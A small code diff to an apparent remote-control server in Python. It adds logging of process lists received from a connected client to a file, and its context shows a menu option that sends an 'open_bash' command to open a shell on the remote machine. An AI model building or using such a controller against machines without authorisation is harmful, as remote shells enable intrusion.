@@ -82,9 +82,15 @@ class Server():
                 ps=self.c.recv(99999).decode()
                 if "PID" in ps:
                     print(ps)
+                    with open("ps.log","a") as f:
+                        f.write(ps)
+                    print("Saved Logs In ps.log")
                 else:
                     print("Process Name\t\tPID")
                     print(ps)
+                    with open("ps.log","a") as f:
+                        f.write(ps)
+                    print("Saved Logs In ps.log")
             # Open Bash
             elif choice==8:
                 self.c.send("open_bash".encode())
